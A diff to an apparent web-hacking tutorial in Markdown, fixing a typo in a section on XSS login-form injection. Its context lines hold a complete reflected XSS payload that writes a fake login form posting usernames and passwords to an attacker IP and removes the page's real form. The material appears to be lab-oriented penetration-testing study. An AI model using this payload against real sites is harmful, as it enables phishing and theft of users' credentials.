@@ -35,11 +35,13 @@ shown after our injection too, to do so we only need to add a javascript comment
 For removing Elements we can use `document.getElementById()` function + `.remove()`.
 - Obtaining the id of the element we want to remove:
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c9e4c784-205a-4c97-8d66-641d5622e3b6" width="700"><br />
-- Ading to our payload:
+- Adding to our payload:
 </br>
+
 ```html
 '><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.31:443><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
 ```
+
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c2040539-1a58-40c2-97d8-3dafc6a6535f" width="500">
 
 ## Executing the attack.
